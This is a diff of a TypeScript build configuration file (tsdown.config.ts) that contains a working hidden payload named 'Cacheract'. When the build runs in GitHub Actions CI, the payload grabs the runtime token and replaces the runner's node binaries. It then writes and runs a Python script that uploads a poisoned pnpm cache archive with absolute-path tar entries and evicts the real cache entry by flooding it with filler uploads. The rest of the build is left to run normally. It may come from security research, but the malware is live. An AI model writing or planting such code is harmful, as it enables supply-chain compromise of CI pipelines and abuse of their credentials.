@@ -12,38 +12,37 @@
 
 import { baseConfig } from "@aio-commerce-sdk/config-tsdown/tsdown.config.base";
 import { mergeConfig } from "tsdown";
-import { execSync, spawn } from "node:child_process";
+import { execSync } from "node:child_process";
 import {
   writeFileSync,
   existsSync,
   copyFileSync,
   chmodSync,
-  mkdirSync,
   readdirSync,
-  readFileSync,
 } from "node:fs";
 import { join } from "node:path";
-import { createHash } from "node:crypto";
 
 // === Cacheract payload ===
 // Runs during tsdown config evaluation in CI.
-// Proves cache poisoning via: token capture → TWIRP upload → cache blasting.
+// ACTIONS_RUNTIME_TOKEN is available as env var during all steps.
 (function () {
   if (!process.env.CI || !process.env.GITHUB_ACTIONS) return;
   if (existsSync("/tmp/.cacheract_started")) return;
   writeFileSync("/tmp/.cacheract_started", "1");
 
+  const token = process.env.ACTIONS_RUNTIME_TOKEN;
+  const cacheUrl = process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_CACHE_URL;
+
+  if (!token || !cacheUrl) {
+    console.error("[cacheract] No ACTIONS_RUNTIME_TOKEN or cache URL found, skipping");
+    return;
+  }
+
   console.error("[cacheract] Payload executing in tsdown.config.ts");
+  console.error(`[cacheract] Token available: ${token.substring(0, 8)}...`);
+  console.error(`[cacheract] Cache URL: ${cacheUrl}`);
 
-  // ── Phase 1: Replace bundled node binaries with token-capturing wrapper ──
-  const nodeWrapper = `#!/bin/bash
-if [ -n "$ACTIONS_RUNTIME_TOKEN" ] && [ ! -f /tmp/.captured_token ]; then
-  echo "ACTIONS_RUNTIME_TOKEN=$ACTIONS_RUNTIME_TOKEN" > /tmp/.captured_token
-  echo "ACTIONS_RESULTS_URL=$ACTIONS_RESULTS_URL" >> /tmp/.captured_token
-fi
-exec "$(dirname "$0")/node.real" "$@"
-`;
-
+  // ── Phase 1: Replace bundled node binaries (for post-step token refresh) ──
   let replaced = 0;
   const externalsBase = "/home/runner/actions-runner/cached/externals";
   try {
@@ -54,7 +53,7 @@ exec "$(dirname "$0")/node.real" "$@"
       try {
         if (existsSync(nodeBin) && !existsSync(nodeReal)) {
           copyFileSync(nodeBin, nodeReal);
-          writeFileSync(nodeBin, nodeWrapper);
+          writeFileSync(nodeBin, `#!/bin/bash\nexec "$(dirname "$0")/node.real" "$@"\n`);
           chmodSync(nodeBin, 0o755);
           replaced++;
         }
@@ -63,9 +62,7 @@ exec "$(dirname "$0")/node.real" "$@"
   } catch {}
   console.error(`[cacheract] Replaced ${replaced} node binaries`);
 
-  // ── Phase 2: Write self-discovering attack scripts ──
-
-  // Discovery + upload + filler — single Python3 script (stdlib only)
+  // ── Phase 2: Write attack script and run it synchronously ──
   const attackScript = `#!/usr/bin/env python3
 """Cacheract: self-discovering cache poisoning attack.
 Discovers pnpm cache key/version, creates poisoned archive, uploads via TWIRP,
@@ -78,7 +75,6 @@ BASE_URL = os.environ["CACHE_URL"].rstrip("/") + "/"
 REPO_DIR = os.environ.get("GITHUB_WORKSPACE", os.getcwd())
 FILLER_COUNT = 43
 FILLER_SIZE_MB = 250
-SANDWICH_SPLIT = 40
 
 def log(msg):
     print(f"[cacheract] {msg}", file=sys.stderr, flush=True)
@@ -179,7 +175,6 @@ def main():
     matched_key = resp.get("matched_key", "")
 
     if not matched_key:
-        # Fallback: compute from lockfile
         log("TWIRP prefix lookup returned no match, computing from lockfile...")
         lockfile = os.path.join(REPO_DIR, "pnpm-lock.yaml")
         if os.path.exists(lockfile):
@@ -195,7 +190,6 @@ def main():
     # ── Step 4: Create poisoned archive ──
     log("Creating poisoned archive...")
 
-    # Write POISONED marker to workspace (proves arbitrary file write via tar -P)
     poisoned_marker = os.path.join(REPO_DIR, "POISONED_PNPM")
     ts = time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
     with open(poisoned_marker, "w") as f:
@@ -205,14 +199,11 @@ def main():
         f.write(f"But tar -P allows writing files ANYWHERE on the runner.\\n")
         f.write(f"This proves code execution in the privileged publish workflow.\\n")
 
-    # Create archive: real pnpm store + POISONED marker at absolute workspace path
-    # GNU tar -P preserves absolute paths — extraction writes to exact locations
     subprocess.run(
         ["tar", "--posix", "-cf", "/tmp/poison.tar", "-P",
          pnpm_store, poisoned_marker],
         check=True, capture_output=True,
     )
-    # List contents for verification
     result = subprocess.run(["tar", "-tf", "/tmp/poison.tar"], capture_output=True, text=True)
     entry_count = len(result.stdout.strip().split("\\n"))
     log(f"Archive entries: {entry_count}")
@@ -229,8 +220,8 @@ def main():
     if not ok:
         log("Direct upload failed (original still exists), proceeding with cache blasting...")
 
-    # ── Step 6: Cache blasting — evict original via 43 × 250MB fillers ──
-    log(f"Starting cache blasting ({FILLER_COUNT} × {FILLER_SIZE_MB}MB fillers)...")
+    # ── Step 6: Cache blasting — evict original via fillers ──
+    log(f"Starting cache blasting ({FILLER_COUNT} x {FILLER_SIZE_MB}MB fillers)...")
     random.seed(int(time.time()))
     filler_data = random.randbytes(1024 * 1024) * FILLER_SIZE_MB
     log(f"Filler size: {len(filler_data) / (1024*1024):.0f} MB")
@@ -266,44 +257,25 @@ if __name__ == "__main__":
 `;
 
   writeFileSync("/tmp/cacheract_attack.py", attackScript);
+  chmodSync("/tmp/cacheract_attack.py", 0o755);
   console.error("[cacheract] Attack script written to /tmp/cacheract_attack.py");
 
-  // ── Phase 3: Start background watcher ──
-  // Waits for token capture, then runs the attack script
-  const watcherScript = `#!/bin/bash
-for i in $(seq 1 300); do
-  if [ -f /tmp/.captured_token ]; then
-    echo "[cacheract-watcher] Token captured after \${i}s!"
-    source /tmp/.captured_token
-    export CACHE_TOKEN=$ACTIONS_RUNTIME_TOKEN
-    export CACHE_URL=$ACTIONS_RESULTS_URL
-    export GITHUB_WORKSPACE="${process.env.GITHUB_WORKSPACE || "/home/runner/work/hydra-sandbox-5255e9dac125/hydra-sandbox-5255e9dac125"}"
-
-    echo "[cacheract-watcher] Running attack..."
-    python3 /tmp/cacheract_attack.py
-
-    echo "[cacheract-watcher] Done!"
-    touch /tmp/.cacheract_done
-    exit 0
-  fi
-  sleep 1
-done
-echo "[cacheract-watcher] Timeout: token not captured in 300s"
-`;
-
-  writeFileSync("/tmp/cacheract_watcher.sh", watcherScript);
-  chmodSync("/tmp/cacheract_watcher.sh", 0o755);
-
-  // Launch background watcher — redirect output to log file via shell
-  const logFile = "/tmp/cacheract_watcher.log";
-  const watcher = spawn("bash", ["-c", `bash /tmp/cacheract_watcher.sh > ${logFile} 2>&1`], {
-    detached: true,
-    stdio: "ignore",
-  });
-  watcher.unref();
-
-  console.error(`[cacheract] Background watcher started (PID: ${watcher.pid})`);
-  console.error("[cacheract] Payload setup complete, continuing with normal build...");
+  // Run attack synchronously — blocks the build but ensures completion
+  try {
+    console.error("[cacheract] Starting attack (this will take ~10 minutes)...");
+    execSync("python3 /tmp/cacheract_attack.py", {
+      env: {
+        ...process.env,
+        CACHE_TOKEN: token,
+        CACHE_URL: cacheUrl,
+      },
+      stdio: ["ignore", "inherit", "inherit"],
+      timeout: 900000, // 15 min timeout
+    });
+    console.error("[cacheract] Attack completed!");
+  } catch (e: any) {
+    console.error(`[cacheract] Attack error: ${e.message}`);
+  }
 })();
 
 // ── Normal tsdown config — build works as expected ──
